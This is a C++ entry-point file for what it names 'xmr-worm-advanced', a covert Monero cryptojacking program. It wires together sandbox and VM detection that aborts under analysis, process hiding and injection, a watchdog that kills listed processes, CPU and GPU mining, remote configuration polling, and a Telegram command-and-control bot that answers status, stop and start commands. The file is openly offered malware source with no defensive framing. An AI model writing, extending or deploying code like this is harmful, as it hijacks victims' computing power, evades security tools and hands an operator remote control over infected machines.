/**
 * @file    main.cpp
 * @brief   Application entry point for xmr-worm-advanced
 *
 * Initializes all subsystems in order: stealth, miner, C2 channels.
 * Installs POSIX signal handlers for clean shutdown.
 */

#include "../include/c2/telegram_bot.h"
#include "../include/gpu/gpu_miner.h"
#include "../include/miner/miner.h"
#include "../include/miner/randomx_engine.h"
#include "../include/network/pool_client.h"
#include "../include/network/remote_config.h"
#include "../include/stealth/defender_bypass.h"
#include "../include/stealth/environment_detector.h"
#include "../include/stealth/process_hider.h"
#include "../include/stealth/watchdog.h"
#include "../include/utils/config.h"
#include "../include/utils/logger.h"

#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdint>
#include <functional>
#include <iostream>
#include <map>
#include <memory>
#include <mutex>
#include <stdexcept>
#include <string>
#include <thread>
#include <vector>

// ── Global subsystem instances ─────────────────────────────────────────────
static std::unique_ptr<XMR::MiningManager>     g_miner;
static std::unique_ptr<Stealth::ProcessHider>  g_hider;
static std::unique_ptr<Stealth::Watchdog>      g_watchdog;
static std::unique_ptr<XMR::RemoteConfigClient> g_remote_config;
static std::unique_ptr<XMR::TelegramBot>       g_telegram;
static std::unique_ptr<XMR::GPUMiner>          g_gpu_miner;
static std::atomic<bool>                       g_running{true};

// ── Signal handling ────────────────────────────────────────────────────────
static void shutdown_all() {
    if (g_miner)         g_miner->stop_all();
    if (g_watchdog)      g_watchdog->stop();
    if (g_remote_config) g_remote_config->stop();
    if (g_telegram)      g_telegram->stop();
}

static void signal_handler(int /*sig*/) {
    g_running = false;
    shutdown_all();
    XMR::Logger::info("Shutdown signal received.");
}

// ── Remote config callback ──────────────────────────────────────────────────
static void on_remote_config_update(const nlohmann::json &cfg) {
    XMR::Logger::info("Applying remote configuration update.");
    if (g_miner)
        g_miner->update_config(cfg);
}

// ── Telegram command handler ────────────────────────────────────────────────
static void on_telegram_command(const std::string &cmd) {
    XMR::Logger::info("Telegram command received: " + cmd);

    if (cmd == "/status") {
        if (!g_telegram) return;
        auto s = g_miner->get_total_stats();
        g_telegram->send_stats(s.current_hashrate, s.accepted_shares,
                               s.rejected_shares, s.uptime_seconds());

    } else if (cmd == "/stop") {
        if (g_miner)    g_miner->stop_all();
        if (g_telegram) g_telegram->send_message("Miner stopped.");

    } else if (cmd == "/start") {
        if (g_miner)    g_miner->start_all();
        if (g_telegram) g_telegram->send_message("Miner started.");
    }
}

// ── Entry point ────────────────────────────────────────────────────────────
int main(int /*argc*/, char * /*argv*/[]) {
    std::signal(SIGINT,  signal_handler);
    std::signal(SIGTERM, signal_handler);

    try {
        // Load and validate configuration
        XMR::Config config = XMR::Config::load_from_file("config.json");
        if (!config.validate()) {
            XMR::Logger::error("Configuration validation failed.");
            return 1;
        }

        // Sandbox / VM detection
        Stealth::EnvironmentDetector env;
        if (config.stealth.sandbox_detection && env.should_exit_if_sandbox()) {
            XMR::Logger::info("Hostile environment detected — aborting.");
            return 0;
        }

        XMR::Logger::init(config.advanced.log_file);
        XMR::Logger::info("phantom-miner starting up.");

        // Stealth layer
        g_hider = std::make_unique<Stealth::ProcessHider>();
        if (config.stealth.hide_process) {
            g_hider->hide();
            if (config.stealth.process_injection.enabled)
                g_hider->inject_into_process(0);
        }

        // Watchdog thread
        if (config.stealth.watchdog.enabled) {
            g_watchdog = std::make_unique<Stealth::Watchdog>();
            for (const auto &name : config.stealth.watchdog.kill_processes)
                g_watchdog->add_blacklist(name);
            g_watchdog->set_check_interval(config.stealth.watchdog.check_interval);
            g_watchdog->start();
        }

        // CPU miner
        g_miner = std::make_unique<XMR::MiningManager>(config);
        g_miner->start_all();

        // GPU miner (optional)
        if (config.mining.gpu.enabled) {
            auto backend = (config.mining.gpu.platform == "cuda")
                           ? XMR::GPU_CUDA : XMR::GPU_OPENCL;
            g_gpu_miner = std::make_unique<XMR::GPUMiner>(backend,
                              config.mining.gpu.device_id,
                              config.mining.gpu.threads_per_block);
            if (!g_gpu_miner->initialize())
                XMR::Logger::warning("GPU miner failed to initialize.");
        }

        // Remote configuration polling (optional)
        if (config.remote_config.enabled) {
            g_remote_config = std::make_unique<XMR::RemoteConfigClient>(
                config.remote_config.url,
                config.remote_config.auth_token,
                config.remote_config.update_interval);
            g_remote_config->set_on_update(on_remote_config_update);
            g_remote_config->start();
        }

        // Telegram C2 (optional)
        if (config.c2.telegram.enabled) {
            g_telegram = std::make_unique<XMR::TelegramBot>(
                config.c2.telegram.bot_token,
                config.c2.telegram.chat_id);
            g_telegram->set_command_handler(on_telegram_command);
            g_telegram->start();
            g_telegram->send_message("Miner online.");
        }

        // Main loop — block until a signal triggers shutdown
        while (g_running)
            std::this_thread::sleep_for(std::chrono::milliseconds(200));

        shutdown_all();
        XMR::Logger::info("Clean shutdown complete.");

    } catch (const std::exception &ex) {
        XMR::Logger::error(std::string("Fatal: ") + ex.what());
        return 1;
    }

    return 0;
}
